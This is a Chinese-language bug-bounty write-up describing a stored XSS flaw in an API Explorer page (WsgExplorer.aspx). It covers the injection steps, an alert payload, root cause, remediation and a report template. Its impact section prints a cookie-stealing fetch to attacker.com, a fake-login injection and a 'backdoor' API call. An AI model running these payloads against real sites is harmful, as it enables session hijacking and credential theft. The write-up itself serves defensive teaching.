#  我在 API Explorer 中发现了一个存储型 XSS 漏洞——以下是我的具体操作步骤  
haidragon
                    haidragon  安全狗的自我修养   2026-04-28 04:26  
  
# 官网：http://securitytech.cc  
  
  
有时候，最有价值的漏洞就藏在开发者用来测试自己 API 的工具中。  
##    
  
每个漏洞猎人都经历过这种时刻。  
  
你盯着主应用看了好几个小时：登录表单、搜索框、用户资料字段 —— 全都经过加固、过滤。  
  
你准备收工了。  
  
然后你进入了应用的一个角落 —— 感觉不太一样。  
  
不够精致，更像是内部工具，却被悄悄暴露到了公网。  
  
我就是在这种地方发现了这个漏洞。  
  
目标是一个 **WSG（Web Services Gateway）Explorer**  
 —— 本质上是一个内置的 API 测试界面，位于：  
```
WsgExplorer.aspx
```  
  
可以把它理解为类似 Swagger UI 或浏览器版 Postman。  
  
它包含：  
- 导航树  
- 查询构建器  
- 创建和修改数据的功能  
开发者使用它来直接测试 API 接口。  
  
它显然不是核心功能，也正因为如此，没有人认真检查它。  
## First Look at the Interface  
  
该 Explorer 在导航树中暴露了多个 API 资源分类：  
```
ConnectionFormats
MetaSchema
Plugins
Policies
Repositories←这里引起了注意
ServiceVersions
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnvT1vvRFCCZjQFAiaXpG7yxfCOZTNpRHOMRMBF9Gnic1TmSAg5qhtZic2cCyJmO6w0ENbhlib13sXiaWOWWbVt0tRrFia6ibiceclkPg8g/640?wx_fmt=png&from=appmsg "")  
  
该界面允许用户：  
- 查询资源  
- 生成测试集合  
- 修改 / 上传数据  
这类功能几乎总是涉及用户输入，并且会在某处回显。  
  
只要存在回显，就存在 XSS 的可能。  
## Finding the Injection Point  
  
我从 **Repositories**  
 节点开始测试，因为它允许用户自定义名称和元数据。  
  
问题是：应用是否对输入进行了过滤？  
### Step 1 — 测试普通输入  
```
test_sadanand_123
```  
  
提交后刷新导航树，可以看到内容被回显。  
  
说明输入被存储并渲染到了 DOM 中。  
### Step 2 — 测试 HTML 注入  
```
<b>test</b>
```  
  
结果显示为加粗文本。  
  
没有进行编码。  
  
应用直接将 HTML 注入到了页面中。  
  
浏览器将输入当作 HTML 解析，而不是纯文本。  
### Step 3 — 测试脚本执行  
```
<imgsrc=xonerror="alert('Hacked by Sadanand')">
```  
  
提交 payload 后返回导航树。  
  
浏览器立即弹出 alert。  
## Proof of Concept  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnuWGVcvHRaexVticNMM8qmfdCXdsHX31DUeFIcSiag6KovKH5cFbTWK1XbAuzHjAt7L3FuCyGgzCDoxoNzplxGUwdgehEjaFXZMg/640?wx_fmt=png&from=appmsg "")  
  
alert 在应用域中执行。  
  
payload 被存储在后端，每次加载该节点时都会执行。  
  
这是一个 **存储型 XSS（Stored XSS）**  
。  
  
页面源码中也可以看到 payload 被直接嵌入 DOM：  
```
id="_3c_img_20_src_3d__22_x_22__20_onerror_3d__22_alert_28__27_Hacked_20_by_20_Sadanand_27_..."
```  
  
应用尝试对 id 属性进行编码，但没有对实际 HTML 内容进行编码。  
  
这是典型的“部分过滤”错误。  
## Why Stored XSS Is Worse Than Reflected  
  
很多初学者把所有 XSS 当成一样的，这是错误的。  
<table><thead><tr style="box-sizing: border-box;margin-top: 0px;"><th style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;font-style: normal;font-weight: bold;text-align: left;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">类型</span></section></th><th style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;font-style: normal;font-weight: bold;text-align: left;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">是否持久</span></section></th><th style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;font-style: normal;font-weight: bold;text-align: left;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">是否需要点击</span></section></th><th style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;font-style: normal;font-weight: bold;text-align: left;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">影响</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;margin-top: 0px;"><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">反射型 XSS</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">否</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">是</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">中</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">DOM XSS</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">否</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">是</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">中</span></section></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">存储型 XSS</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">是</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">否</span></section></td><td style="box-sizing: border-box;margin: 0px;padding: 0.5rem 1rem;border: 1px solid rgb(233, 235, 236);"><section><span leaf="">高 / 严重</span></section></td></tr></tbody></table>  
存储型 XSS 的特点：  
- payload 存储在数据库中  
- 每个访问页面的用户都会触发  
- 不需要诱导点击  
在这个 API Explorer 中，受害者通常是：  
- 开发者  
- 管理员  
- 支持人员  
这些都是高权限用户。  
## What an Attacker Could Do With This  
  
真实攻击者不会停留在 alert。  
### 1. 窃取 Session  
```
fetch('https://attacker.com/steal?c='+ document.cookie)
```  
  
如果 Cookie 没有 HttpOnly，攻击者可以获取会话。  
### 2. 窃取凭证  
```
document.body.innerHTML ='<div>伪造登录界面...</div>'
```  
  
注入一个假的登录界面，诱导用户输入账号密码。  
### 3. 滥用内部 API  
```
fetch('/wsg/v2.8/Repositories',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({name:'backdoor', config:'...'})
})
```  
  
利用当前用户权限执行 API 请求。  
### 4. 蠕虫式传播  
  
如果注入的节点对所有用户可见：  
  
每个用户访问都会触发 XSS，从而扩大影响。  
## The Root Cause  
  
漏洞产生的原因是两个错误同时存在：  
### 1. 存储未过滤输入  
  
用户输入被直接存入后端，没有处理：  
- <  
- >  
- "  
### 2. 渲染时直接使用 HTML  
  
前端使用类似：  
```
innerHTML
```  
  
而不是：  
```
textContent
```  
## 修复方式  
  
必须同时修复：  
### 服务端  
- 过滤或拒绝 HTML 输入  
### 客户端  
- 使用 textContent  
- 或对输出进行编码  
只修一端是不够的。  
## Bug Report 模板  
  
**Title**  
```
Stored XSS inWsgExplorerNavigationTree via UnsanitizedRepositoryNames
```  
  
**Severity**  
```
High
```  
  
**Affected Endpoint**  
```
https://[target]/wsg/Pages/WsgExplorer.aspx
```  
  
**Steps to Reproduce**  
1. 打开 WsgExplorer  
1. 进入 Repositories  
1. 创建：  
```
<imgsrc=xonerror="alert('XSS')">
```  
1. 保存并刷新  
1. 观察执行  
**Proof of Concept**  
  
**Impact**  
  
存储型 XSS，可导致：  
- 会话劫持  
- 凭证窃取  
- 未授权 API 操作  
**Remediation**  
- 存储时过滤输入  
- 渲染时编码输出  
## Key Takeaways  
1. 优先测试开发者工具（后台、API Explorer、内部系统）  
1. 所有回显点都要测试  
1. 存储型 XSS 优先级高于反射型  
1. 部分过滤不等于安全  
1. 使用 alert 即可证明漏洞存在  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBntu39uHDhcBMBcwTAXytiboYsGqib68Zbyoc3WLjRIQzsQWUudHVP5lkdKpfeWFdMYdgVsRzaicHkx0rNjVRMo9W7RGlc9PErJxAg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBntvO4CIsCnmvvy0Y1u9fPExgpS0Tf4EI8pHG2I72FYUbjxNvADcibpG8uXx3L8K4ovRn1iaWBAjSTb3dGQcLjPmFicS1QmlsNUaYw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5 "")  
  
  
  
  
****  
  
- 公众号:安全狗的自我修养  
  
- vx:2207344074  
  
- http://  
gitee.com/haidragon  
  
- http://  
github.com/haidragon  
  
- bilibili:haidragonx  
  
- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=omk5zkfc&tp=webp#imgIndex=5 "")  
  
